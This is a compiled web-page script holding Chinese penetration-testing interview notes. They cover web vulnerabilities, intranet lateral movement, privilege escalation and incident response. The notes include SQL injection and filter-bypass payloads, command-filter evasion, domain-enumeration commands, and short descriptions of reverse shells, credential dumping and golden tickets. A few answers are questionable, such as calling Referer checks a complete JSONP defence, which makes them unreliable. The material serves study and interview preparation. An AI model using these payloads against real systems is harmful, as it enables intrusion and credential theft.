import{_ as p}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as l,c as i,a as s,b as a,d as t,e as n,r as o}from"./app.342c7ddc.js";const r={},d=n(`<p>梳理网络安全知识点为自己查漏补缺，或者说是面经总结也OK。</p><h2 id="web安全" tabindex="-1"><a class="header-anchor" href="#web安全" aria-hidden="true">#</a> Web安全</h2><h3 id="sql注入" tabindex="-1"><a class="header-anchor" href="#sql注入" aria-hidden="true">#</a> SQL注入</h3><details class="custom-container details"><summary>SQL注入的原理？注入方式？怎么防御？</summary><p>Web应用对用户输入的数据校验处理不严，致使用户可以拼接执行SQL语句；</p><p><strong>注入方式有</strong></p><p>布尔型盲注：根据页面返回的结果判断条件真假</p><p>时间型盲注：根据页面返回时间是否增加判断是否存在注入</p><p>基于错误的注入：页面返回错误信息</p><p>联合查询注入：可用union的情况下</p><p>堆叠查询注入：可同时执行多条语句</p><p>使用参数化查询，因为数据库不会把参数的内容当作SQL指令的一部分拼接执行，而是在数据库完成SQL指令的编译后才套用参数运行，这就是预编译</p></details><details class="custom-container details"><summary>预编译不能防范的注入如何修复？</summary><p>order by 注入不能用预编译防御。</p><p>预编译会自动给传入的参数加上单引号，order by后边的字段名会变成字符串造成SQL语法错误</p><p>order by之后跟的字段名肯定有限，且是数据库中已经存在的字段，可以使用白名单限制字段名</p></details><details class="custom-container details"><summary>盲注是什么？怎么盲注？</summary><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式。（Time 和 Boolean）</p><p>可以用benchmark，sleep等函数造成延时效果，如果关键字被过滤了，可以让两个非常大的数据表做笛卡尔积产生大量的计算从而产生时间延迟。</p></details><details class="custom-container details"><summary>宽字节注入是什么原理？</summary><p>在数据库中使用了宽字符集(GBK，GB2312等)，除了英文都是一个字符占两字节；</p><p>MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii&gt;128才能达到汉字范围)；</p><p>在PHP中使用addslashes函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\\”，变成%5c%27;</p><p>可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字，%5c被吃掉了，单引号由此逃逸可以用来闭合语句。</p></details><details class="custom-container details"><summary>MySQL时间型盲注如何加快速度？</summary><p>1）Windows平台上可以用DNSlog加速注入</p><p>2）利用二分查找法</p><ul><li>利用 ASCII 码作为条件来查询，ASCII 码中字母范围在65~122之间</li><li>以这个范围的中间数为条件，判断payload中传入的 ASCII 码是否大于这个中间数</li><li>如果大于，就往中间数122这块查找。反之亦然</li></ul></details><details class="custom-container details"><summary>mysql的用户名密码是存放在那张表里面？mysql密码采用哪种加密方式？</summary><p>mysql数据库的user表，以MySQL 4.1版本为分界线，两种加密方式。</p><p>mysql323加密：（16位）、mysqlSHA1加密：（去掉*号40位）</p></details><details class="custom-container details"><summary>mysql版本低于5.0怎么注入？</summary><p>MySQL 5.0以下没有<code>information_schema</code>这个系统表，无法列表名；</p><p>安全狗3.5版本会拦截information_schema关键字；这个时候可以利用虚表取数据；</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>过滤逗号的SQL注入如何绕过？</summary><p>联合查询的情况可以使用join和别名绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--原sql命令</span>

<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用from...for绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token string">&#39; and ascii(substr((select database()),1,1))=xxx#

&#39;</span> <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">23</span>

<span class="token comment">--如果过滤了空格，可以用括号代替空格</span>
&#39; <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>过滤limit后的逗号如何绕过？</summary><p>使用offset关键字绕过</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token comment">--此时 limit 1 offset 2 可以代替 limit 1,2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>尖括号被过滤怎么办？</summary><p>可以使用<code>between and</code>代替尖括号，并用16进制，来绕过单引号的过滤</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">&#39;a&#39;</span> <span class="token operator">and</span> <span class="token string">&#39;z&#39;</span><span class="token punctuation">;</span>   <span class="token comment">--原sql</span>
<span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token number">0x61</span> <span class="token operator">and</span> <span class="token number">0x7a</span><span class="token punctuation">;</span> <span class="token comment">--16进制</span>

<span class="token comment">--在sqlmap中使用between and 代替其它字符加上 --tamper=between 即可</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>如何绕过WAF，实战与原理？</summary><p>关键字双写绕过</p><p>内联注释执行SQL</p><p>注释符加%0a换行执行SQL</p><p>空格被过滤，用%0a、%0b、%0c、%0d、%09、%A0代替</p><p>利用HTTP/1.1新特性pipeline，在第二个数据包带入脏数据，\`Chunked分块传输\`\`\`</p></details><details class="custom-container details"><summary>如何通过sql注入写shell，条件是什么?</summary><p>可以使用outfile或dumpfile将shell写到网站目录</p><p>dumpfile每次只能导出一行数据，不会在末尾追加行，可用来写入二进制文件</p><p><strong>利用条件</strong></p><p>1）数据库用户为root权限</p><p>2）知道网站绝对路径，且有写入权限</p><p>3）PHP的GPC为off状态（魔术引号 POST、GET、Cookie）</p></details><h3 id="同源策略" tabindex="-1"><a class="header-anchor" href="#同源策略" aria-hidden="true">#</a> 同源策略</h3><details class="custom-container details"><summary>简述一下什么是同源策略，如何规避？</summary><p>所谓同源是指两个网页，协议、主机、端口都相同。</p><p>A网页设置的Cookie，B网页不能读取，除非这两个网页同源。</p><p>可以使用JSONP和CORS规避同源策略。</p></details><details class="custom-container details"><summary>B站与A站不同源的情况下如何从B站获取到A站用户信息?</summary><p>两个网页一级域名相同，只是二级域名不同</p><p>浏览器允许通过设置document.domain属性共享 Cookie，拿到DOM等</p><p>在根域范围内，可以 把domain属性的值设置为它的上一级域</p></details><details class="custom-container details"><summary>JSONP和CORS有何区别？</summary><p>Jsonp只适用GET方法</p><p>通过在客户端动态创建一个 script 标签，src 属性指向一个跨域的 URL</p><p>服务端返回一段可执行的js脚本，脚本的内容是一个函数的调用，函数的参数是要传输的数据</p><p>CORS跨域资源共享支持GET、POST方法</p><p>通过在服务器端设置响应头部信息来控制资源是否允许跨域访问</p><p>服务器端在响应请求时，返回一个 Access-Control-Allow-Origin 头部信息</p><p>浏览器根据该头部信息判断是否允许访问该资源</p></details>`,19),c={class:"custom-container details"},u=s("summary",null,"JSONP和CORS有何缺陷如何修复？",-1),m=s("p",null,"Jsonp只适用GET方法",-1),h=s("p",null,[a("动态插入带有跨域url的 "),s("code",null,"script"),a(" 标签，服务端返回一段可执行的js代码")],-1),k=s("p",null,"CORS跨域资源共享支持GET、POST方法",-1),b={href:"https://www.ruanyifeng.com/blog/2016/04/cors.html",target:"_blank",rel:"noopener noreferrer"},v=n(`<details class="custom-container details"><summary>JSONP和CORS在修复过程中是如何传递token的？</summary><ol><li>JSONP：由于 JSONP 是通过动态创建 <code>&lt;script&gt;</code> 标签的方式获取数据，因此无法使用标准的 HTTP 头部来传递 Token。通常情况下，Token 被包含在 URL 的查询字符串参数中，例如 <code>http://example.com/data?callback=handleData&amp;token=xxxxxx</code>。服务器接收到请求后，将 Token 包含在返回的 JavaScript 代码中，以便客户端可以在处理数据时使用 Token 进行身份验证和授权。</li><li>CORS：在使用 CORS 进行跨域请求时，客户端需要向服务器发送一个预检请求（OPTIONS 请求），以检查是否允许跨域请求和使用哪些 HTTP 方法、头部和身份验证方法。在预检请求中，客户端会将 Token 包含在请求的头部中，例如 <code>Authorization: Bearer xxxxxx</code>。如果服务器返回的响应头部中包含了 <code>Access-Control-Allow-Headers</code> 和 <code>Access-Control-Allow-Methods</code>，则表示允许使用这些头部和方法进行跨域请求，客户端随后可以发送真实的请求并将 Token 包含在头部中进行身份验证和授权。</li></ol><p>无论是 JSONP 还是 CORS，在传递 Token 时都要遵守安全最佳实践，例如使用 HTTPS 协议进行传输、对 Token 进行加密或哈希处理、在服务器端对 Token 进行验证等等。</p></details><details class="custom-container details"><summary>CORS如果是不允许的域发起了请求，会返回什么？</summary><p>如果服务器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但没有任何<em>CORS</em>相关的头信息字段</p></details><details class="custom-container details"><summary>JSONP的token跟在哪个位置？</summary><p>在 JSONP 请求中，Token 参数通常是作为该函数的参数名出现</p></details><details class="custom-container details"><summary>JSONP referer校验能否百分百防护吗？</summary><p>可以</p></details><details class="custom-container details"><summary>为什么同源策略无法防御CSRF？</summary><p>因为同源策略只适用于读取数据而不写入数据的情况</p><p>CSRF通过构造表单从用户的浏览器来注入额外的网络请求</p></details><h3 id="xss跨站" tabindex="-1"><a class="header-anchor" href="#xss跨站" aria-hidden="true">#</a> XSS跨站</h3><details class="custom-container details"><summary>XSS原理分类和防御方法？</summary><h4 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h4><p>应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时</p><p>攻击者通过在受害者的网页中注入恶意脚本，从而在受害者的浏览器中执行恶意代码</p><h4 id="分类" tabindex="-1"><a class="header-anchor" href="#分类" aria-hidden="true">#</a> 分类</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1）反射型
攻击者将恶意脚本注入到 URL 参数或表单输入中
网站服务器接收到请求后，将恶意脚本从请求中取出并返回给用户浏览器，浏览器执行恶意脚本

2）存储型
攻击者将恶意脚本注入到受害者提交的数据中，数据被存储在服务器上
当其他用户访问包含恶意脚本的网页时，恶意脚本会从服务器中取出并在用户浏览器中执行

3）DOM型
攻击者将恶意脚本注入到网页的 DOM 元素中
当用户访问包含恶意脚本的网页时，浏览器会解析 DOM 元素并执行其中的恶意脚本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="防御" tabindex="-1"><a class="header-anchor" href="#防御" aria-hidden="true">#</a> 防御</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1）对输入和输出的字符实体进行编码转义
2）使用HttpOnly禁止js读取cookie，防止攻击者窃取会话令牌
3）用CSP内容安全策略，限制网页中可执行的脚本来源
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>DOM型XSS是什么，如何自动化防御？</summary><p>DOM型返回页面源码中看不到输入的payload， 而是保存在客户端浏览器的DOM中</p><p>为了自动化防御DOM型XSS，可以采用以下方法</p><p>1）使用CSP内容安全策略</p><p>2）使用自动化工具检测和修复：如Google的DOM XSS Auditor</p></details><h3 id="csrf" tabindex="-1"><a class="header-anchor" href="#csrf" aria-hidden="true">#</a> CSRF</h3><details class="custom-container details"><summary>什么是CSRF？如何防御？</summary><p>在执行关键操作时没有进行是否由客户自愿发起的确认，造成客户端请求伪造。</p><p>攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。</p><p>修复方法</p><p>1、验证Referer（有被绕过的风险，从HTTPS页面跳转到HTTP页面时Referer不会被传递）</p><p>2、添加token（保证随机性和一次性）</p></details><details class="custom-container details"><summary>GET和POST利用方法区别？</summary><p>GET型，只需要构造URL，然后诱导受害者访问利用</p><p>POST型，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用</p></details><p>json格式的CSRF如何利用？</p>`,12),y={href:"https://xz.aliyun.com/t/7911",target:"_blank",rel:"noopener noreferrer"},g=n(`<h3 id="ssrf" tabindex="-1"><a class="header-anchor" href="#ssrf" aria-hidden="true">#</a> SSRF</h3><p>SSRF的漏洞原理和危害？</p><p>SSRF服务端请求伪造，由服务端发起，攻击外网无法访问的内部系统；</p><p>比如某识图网站，对目标地址没做合法性验证，就会造成SSRF。</p><p>可用于扫内网端口、file协议读文件、GOPHER打内网应用</p><p>SSRF的利用手段，哪些协议可以利用？</p><p>结合内网redis 如何利用，getshell的手法</p><p>redis getshell中什么样的操作比较危险</p><p>如果dnslog接受到了dns请求能确保有ssrf吗，请说出为什么</p><p>SSRF如何绕过防御措施？</p><p>SSRF的DNS重绑定有了解吗，如何修复？</p><h3 id="xxe注入" tabindex="-1"><a class="header-anchor" href="#xxe注入" aria-hidden="true">#</a> XXE注入</h3><h3 id="文件处理" tabindex="-1"><a class="header-anchor" href="#文件处理" aria-hidden="true">#</a> 文件处理</h3><details class="custom-container details"><summary>文件上传漏洞的绕过方法和防范措施？</summary><p>1）客户端js校验</p><p>2）MIME文件头Content-Type字段(image/gif)校验</p><p>3）文件头内容检测(GIF89a)</p><p>4）文件扩展名校验黑名单</p><p>上传真实的图片Burp拦截修改数据包，木马内容跟在图片后边，修改扩展名</p><p>黑名单找漏网之鱼(.php4.cer.pHP大小写绕过)</p><p><strong>文件上传防范措施</strong></p><p>1）文件上传目录设置为不可执行 2）使用白名单判断文件上传类型</p></details><details class="custom-container details"><summary>文件包含漏洞如何利用？</summary><p>文件包含函数，include、require;</p><p>利用条件：include()等函数通过动态变量的方式引入包含文件，用户能够控制该动态变量</p><p>本地文件包含：file协议读文件，php://filter封装协议读源码</p><p>远程文件包含：allow_url_include=On，远程包含webshell</p></details><h3 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行" aria-hidden="true">#</a> 命令执行</h3><details class="custom-container details"><summary>php有哪些命令执行函数？</summary><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">//执行外部程序并且显示原始输出</span>
<span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//在当前进程空间执行指定程序</span>
<span class="token function">popen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment">//打开进程文件指针</span>
<span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">//执行一个命令，并且打开用来输入/输出的文件指针</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>黑名单绕过</summary><p>1）用\${IFS}代替空格</p><p>2）单引号、双引号： c””at、ca’’t、反斜线 c\\at</p><p>3）可用%0A换行执行命令，换行符自身是一个有效的目录分隔符</p></details><h3 id="反序列化" tabindex="-1"><a class="header-anchor" href="#反序列化" aria-hidden="true">#</a> 反序列化</h3><p>java反序列化产生原因，如何防御？</p><p>php反序列化产生原因，如何防御？</p><h3 id="渗透经验和技巧" tabindex="-1"><a class="header-anchor" href="#渗透经验和技巧" aria-hidden="true">#</a> 渗透经验和技巧</h3><details class="custom-container details"><summary>如果给你一个网站你如何判断后端是什么数据库？</summary><p>1）通过开放端口判断</p><p>2）通过网站开发使用的技术栈判断</p><p>3）尝试让网站报数据库语法错误判断</p><p>常见技术栈组合如下</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>PHP + MySQL + Apache
ASP + MSSQL + IIS
JSP + Oracle + Tomcat
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>只有一个登录框如何渗透测试？</summary><p>1）SQL注入万能密码 ( admin&#39; or 1=1 --)</p><p>2）弱口令爆破</p><p>3）目录扫描</p><p>4）目录遍历，crtl+u查看源码，访问静态文件目录尝试遍历目录</p><p>5）URLfinder查找敏感信息</p><p>6）逻辑漏洞（任意用户注册、改返回包验证绕过）</p></details><h2 id="攻防对抗" tabindex="-1"><a class="header-anchor" href="#攻防对抗" aria-hidden="true">#</a> 攻防对抗</h2><h3 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集" aria-hidden="true">#</a> 信息收集</h3><details class="custom-container details"><summary>你是如何做资产信息收集的？</summary><p>即查找目标所有的暴露面</p><p>1）企业组织架构信息收集（域名、APP和小程序、子公司和对外投资、供应商）</p><p>2）子域名枚举（自己开发工具-被动收集加主动爆破）</p><p>3）IP资产梳理（准确IP全端口、C段常见端口、目标开放服务和Web应用指纹识别）</p><p>4）目录扫描（后台、备份文件、敏感页面、未授权接口）</p><p>5）敏感信息（文档、Github搜源码、Google hacker）</p></details><details class="custom-container details"><summary>打点方式常用哪些漏洞？</summary><p>Web：弱口令+文件上传、SQL注入</p><p>中间件：Shiro反序列化、Weblogic反序列化</p><p>OA：致远、通达、蓝凌</p></details>`,28),S={class:"custom-container details"},x=s("summary",null,"如何绕过网站CDN获取真实IP？",-1),f={href:"http://xxx.com",target:"_blank",rel:"noopener noreferrer"},w=s("p",null,"2）解析子域名，或许有没上CDN的",-1),T=s("p",null,"3）让服务器主动发起请求（SSRF漏洞、注册让其发邮件）",-1),P=n(`<h3 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h3><p>Redis未授权访问如何利用，利用条件是什么?</p><p>当redis以root账户运行，无密码或者弱密码认证，并且绑定0.0.0.0可公网访问的情况下；</p><p><strong>Linux：</strong></p><p>上传SSH公钥登录SSH，原理是在redis中插入一条数据；</p><p>在Web目录写Webshell;</p><p>Crontab定时任务反弹shell；</p><p>利用slave主从复制实现RCE远程命令执行;</p><p>**Windows：**Web目录写Webshell、写入启动项（需重启）、写入MOF（仅限03系统）</p><p>针对利用条件可用以下方法防御：</p><p>1、降权运行redis</p><p>2、使用复杂的密码</p><p>3、限制IP禁止外网访问</p><p>4、另外redis默认不生成日志，可以自己配置来生成日志</p><p>IIS有哪些历史解析漏洞？</p><p>log4j2漏洞利用和原理？</p><p>WebLogic常见漏洞和原理？</p><p><strong>IIOP听说过吗，和什么类似？</strong></p><p>java RMI通信，也就是远程方法调用，默认是使用jrmp协议，也可以选择IIOP</p><p>Fastjson常见漏洞的利用和原理？</p><p>Shiro反序列化漏洞的成因、利用链、如何发现？</p><p>Struts2有哪些重点漏洞，如何形成的？</p><p>(1)struts是java的web框架</p><p>(2)采取OGNL表达式，处理view层数据字符串到controller层转换成java对象</p><p>(3)重点关注的编号如下</p><p><strong>S2-045 影响范围较大</strong></p><p>通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显</p><p><strong>S2-046 和S2-045一样</strong></p><p><strong>S2-016</strong> <strong>影响范围非常大</strong></p><p>JNDI的解析流程和原理？</p><p>17010这个漏洞你怎么利用？</p><h3 id="权限提升" tabindex="-1"><a class="header-anchor" href="#权限提升" aria-hidden="true">#</a> 权限提升</h3><p>MySQL提权的方式有哪些？利用条件？</p><p>MOF root账户 03系统 mof目录可写 secure_file_priv为空表示对mysql导入导出不做限制 在my.ini可以配置</p><p>UDF Create function 调用udf.dll，以系统权限执行系统命令</p><p>SQL Server提权的方式有哪些？</p><p>mssql中，假设为sa权限，如何不通过xp_cmdshell执行系统命令</p><p>有.net环境可以用CLR执行命令提权</p><h3 id="权限维持" tabindex="-1"><a class="header-anchor" href="#权限维持" aria-hidden="true">#</a> 权限维持</h3><p><strong>Linux有哪几种后门实现方式？</strong></p><p>增加超级用户帐号</p><p>ssh无密码登录</p><p>Crontab定时任务</p><p>TCP/ICMP 反弹Shell</p><p>Rootkit工具包</p><h3 id="通道构建" tabindex="-1"><a class="header-anchor" href="#通道构建" aria-hidden="true">#</a> 通道构建</h3><p>反向代理</p><details class="custom-container details"><summary>目标不出网的情况下如何做内网通道？</summary><p>suo5正向代理，利用Webshell端口复用的原理</p></details><h3 id="横向渗透" tabindex="-1"><a class="header-anchor" href="#横向渗透" aria-hidden="true">#</a> 横向渗透</h3><details class="custom-container details"><summary>目标只开了139端口能否利用永恒之蓝？</summary><p>需要使用445端口的SMB文件共享服务，以ms17_010为例我试过关闭445是不行的</p></details><details class="custom-container details"><summary>内网渗透怎么获取服务器账号密码？</summary><p>mimkatz抓明文密码</p></details><details class="custom-container details"><summary>Mimikatz抓密码原理？</summary></details><details class="custom-container details"><summary>不用mimikatz怎么抓明文密码？</summary><p>Sharpdump 注册表导出hash</p></details><p>Server 12限制了抓明文密码，怎么绕过？</p><p>改注册表+强制锁屏+等管理员重新登录即可抓</p><p>你拿到了server03的hash怎么利用？ 你有一个webshell但无法执行系统命令，无法上传，怎么进行内网渗透？ 黄金票据有了解吗？ Regorfe有了解吗，它的工作原理是什么？ 你横向渗透的常用手法有哪些？ 你入侵了一台非域成员主机，如何快速定位到其它域成员主机？</p><p>域内攻击有哪些方法</p><p>MS14-068、Roasting攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay</p><p>你是域成员，如何拿到域控制器？</p><p>定位域控 net time /domain、 net group &quot;domain controllers&quot; /domain</p><p>系统漏洞（1472）+弱口令</p><p>内网渗透拿到了域控制器怎么维持权限？</p><p>黄金票据后门</p><p>通过卷影拷贝导出ntds.dit获取域内所有用户hash</p><p>有哪些横向执行命令的方法？</p><p>psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令</p><p><strong>psexec和wmic或者其他的区别？</strong></p><p>psexec会记录大量日志，wmic不会记录下日志。wmic更为隐蔽</p><p>psexec的底层实现原理是什么? (★)</p><p>命名管道连接SMB共享</p><p><strong>桌面有管理员会话，想要做会话劫持怎么做</strong></p><p>提权到system权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证</p><p>黄金票据有了解吗？</p><p>在域中，每个用户账号的票据都是由Krbtgt生成的，这个账号的密码，储存在域控服务上 。</p><p>TGT票据，因为它是由域账号<code>krbtgt</code>的<code>NTLM Hash</code>加密和签名的</p><p>伪造TGT票据跳过kerberos认证服务器认证过程获取任意server票据</p><p>SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(★★)</p><p>内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (★★★)</p><p>Hash传递、票据传递、金银票后门</p><p>域内如何查询员工对应的机器？ (★)</p><p>如何查询域之间的信任关系？ (★)</p><p>nltest /domain_trusts</p><p>域控开放的常见端口有哪些？(★)</p><p>windows内网中ntlm协议认证过程 (★★★)</p><p>横向渗透中，wmic如何构造有回显的命令执行? (★★)</p><p>在非域主机的情况下，如何快速发现域主机？ (★★)</p><p>mimikatz的原理，哪个补丁导致了mimikatz无法利用，如何绕过? (★★)</p><p>有没有办法在不重启机器的前提下启用wdigest这个SSPI? (★)</p><p>NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制? (★)</p><p>windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么?</p><p>wmic useraccount get Caption,sid</p><h2 id="应急响应" tabindex="-1"><a class="header-anchor" href="#应急响应" aria-hidden="true">#</a> 应急响应</h2><details class="custom-container details"><summary>一台服务器被植入Webshell怎么办？</summary><p>1、用工具扫描网站目录+Web日志审计，查找Webshell的位置，定位时间和范围</p><p>2、根据Webshell创建时间，分析可疑的Web访问，找到漏洞位置，复现漏洞确认漏洞类型</p><p>3、修复漏洞，对服务器和Web应用进行安全加固</p></details><details class="custom-container details"><summary>服务器被植入挖矿病毒如何应对？</summary><p>1）分析网络流量找到挖矿病毒的进程和对外连接地址</p><p>2）根据挖矿病毒进程找到病毒文件样本，上传沙箱分析钱包地址</p><p>3）完全清除病毒样本加固服务器</p></details><details class="custom-container details"><summary>Linux基线加固思路？</summary><p>删除或禁用不必要账户( userdell、passwd -l )</p><p>检查是否存在空口令和root权限的账户</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">awk</span> -F: ‘<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token operator">==</span>””<span class="token punctuation">)</span>’ /etc/passwd
<span class="token function">awk</span> -F: ‘<span class="token punctuation">(</span><span class="token variable">$3</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>’ /etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>添加口令策略 (chage -m 0 -M 30 -E 2000-01-01 -W 7)，设置密码输错锁定</p><p>限制能su到root的用户(vi /etc/pam.d/su)</p><p>禁止root用户直接登录</p><p>关闭不必要的服务 ( systemctl disable 服务名)</p><p>加固SSH服务 ( 使用协议版本2，修改密码允许错误次数为3 )</p><p>设置umask 027 (vi /etc/profile)，即属主有全部权限，同用户组能读和执行，其它无权限；</p><p>设置登陆超时，(vi /etc/profuile)，TMOUT=180，登录三分钟后超时。</p><p>开启日志功能，syslogd日志(系统日志 /var/log/messages，安全日志 /var/log/secure)；</p></details><details class="custom-container details"><summary>IPS和IDS的区别？</summary><p>常见网络安全设备</p><table><thead><tr><th>设备</th><th>功能</th><th>部署方式</th></tr></thead><tbody><tr><td>IDS</td><td>入侵检测系统（基于流量检测攻击）</td><td>旁路</td></tr><tr><td>IPS</td><td>入侵防御系统（基于入侵行为库阻断攻击）</td><td>串联</td></tr><tr><td>FireWall</td><td>防火墙（隔离网络边界控制数据交互）</td><td>串联</td></tr><tr><td>WAF</td><td>Web应用防火墙（基于规则阻断针对Web应用的攻击）</td><td>串联</td></tr><tr><td>GAP</td><td>网闸（信息交换与安全隔离，逻辑隔离）</td><td>串联</td></tr><tr><td>FGAP</td><td>光闸（单项信息传输，逻辑隔离）</td><td>串联</td></tr><tr><td>堡垒机</td><td>运维安全审计系统（身份验证、账号管理、授权控制、安全审计）</td><td>旁路</td></tr><tr><td>DBAudit</td><td>数据库审计（实时记录网络上的数据库活动）</td><td>流量镜像</td></tr><tr><td>AV/EDR</td><td>终端安全（基于特征和行为等查杀危险程序和进程）</td><td>终端安装</td></tr><tr><td>SOC</td><td>安全运营中心（协调所有安全技术提高检测、响应和预防能力）</td><td></td></tr></tbody></table></details><details class="custom-container details"><summary>从主机的层面，反弹shell如何监控？</summary><p>黑客一般会从最简单的TCP协议的反弹shell尝试</p><p>所以HIDS首先要监控基于TCP协议的输入流和输出流重定向流量</p></details><details class="custom-container details"><summary>Linux 中让命令在后台运行的方法有哪些？</summary><p>在命令后加**&amp;<strong>，已在前台运行的用</strong>crtl+z**暂停，然后用bg将作业放到后台；</p><p><strong>jobs -l</strong>可查看作业队列；<strong>fg</strong>可恢复到前台运行；</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nohub ./test.sh <span class="token 